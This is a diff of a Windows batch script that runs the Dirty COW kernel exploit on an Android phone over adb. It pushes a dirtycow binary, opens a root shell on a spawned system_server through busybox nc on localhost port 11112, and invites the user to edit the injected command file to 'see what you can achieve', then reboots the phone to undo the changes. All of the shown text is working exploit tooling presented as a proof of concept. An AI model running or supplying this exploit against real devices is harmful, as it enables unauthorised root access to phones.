@@ -17,9 +17,9 @@ echo [*] IF NO DEVICE LISTED YOU ARE NOT READY TO RUN THIS SCRIPT. CLOSE THIS WI
 echo [*] 
 echo [*] IF DEVICE IS LISTED PRESS ANY KEY ON COMPUTER TO START
 echo [*]
+::adb wait-for-device
 adb devices
 pause
-adb wait-for-device
 cls
 echo [*] copying dirtycow to /data/local/tmp/dirtycow
 adb push pushed/dirtycow /data/local/tmp/dirtycow
@@ -54,11 +54,19 @@ echo [*] OPENING A ROOT SHELL ON THE NEWLY CREATED SYSTEM_SERVER
 echo [*] CREATE A NEW DIRECTORY AS A TEST
 echo [*] CHANGING PERMISSIONS ON NEW DIRECTORY
 adb shell "/data/local/tmp/busybox nc localhost 11112 < /data/local/tmp/cp_comands.txt"
+echo [*]  
+echo --------------------------------------------------------------------------------------------
+echo --------------------------------------------------------------------------------------------
+echo [*] THERE WAS THE PROOF OF CONCEPT
+echo [*] NOW YOU CAN MODIFY THE cp_comands.txt AND START OVER TO SEE WHAT YOU CAN ACHIVE
 pause
 cls
 echo [*]  
-echo.--------------------------------------------------------------------------------------------
-echo.--------------------------------------------------------------------------------------------
-echo [*] PRESS ANY KEY TO FINISH THIS SCRIPT.
+echo --------------------------------------------------------------------------------------------
+echo --------------------------------------------------------------------------------------------
+echo [*] NOW WE REBOOT PHONE TO RESET THE FILES DIRTYCOW CHANGED
+echo [*] 
+echo [*] PRESS ENTER KEY TO FINISH THIS SCRIPT AND REBOOT TO RESTORE PHONE
 pause
+adb reboot
 exit
